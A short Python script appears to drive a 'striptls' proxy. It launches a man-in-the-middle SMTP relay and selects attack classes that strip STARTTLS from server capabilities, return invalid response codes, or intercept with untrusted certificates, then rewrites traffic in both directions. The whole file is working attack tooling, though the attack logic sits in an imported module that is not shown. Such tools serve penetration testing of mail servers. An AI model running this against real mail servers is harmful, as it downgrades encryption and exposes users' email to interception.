from striptls import *

if __name__ == '__main__':
    ret = 0
    if not len(sys.argv)>1:
        print ("""<listen_ip> <listen_port> <forward_ip> <forward_port> [<attack_class>]
    attack_class ... SMTP.StripFromCapabilities, SMTP.StripWithInvalidResponseCode, SMTP.UntrustedIntercept, ...
        """)
        sys.exit(1)
    
    local_listen = (sys.argv[1], int(sys.argv[2]))
    forward_to = (sys.argv[3],int(sys.argv[4]))
    classname = sys.argv[5] if len(sys.argv)>5 else "SMTP.StripFromCapabilities"
    ## hacky!
    if "." in classname:
        lastdot = classname.rfind(".")
        cls = getattr(locals().get(classname[:lastdot]),classname[lastdot+1:])
        
    # magic
    prx = ProxyServer(listen=local_listen, target=forward_to, buffer_size=4096, delay=0.00001)
    logger.info("%s ready."%prx)
    rewrite = RewriteDispatcher()
    rewrite.add(ProtocolDetect.PROTO_SMTP, cls)
    
    logging.info( repr(rewrite))
    prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
    prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
    try:
        prx.main_loop()
    except KeyboardInterrupt:
        logger.warning( "Ctrl C - Stopping server")
        ret+=1
    sys.exit(ret)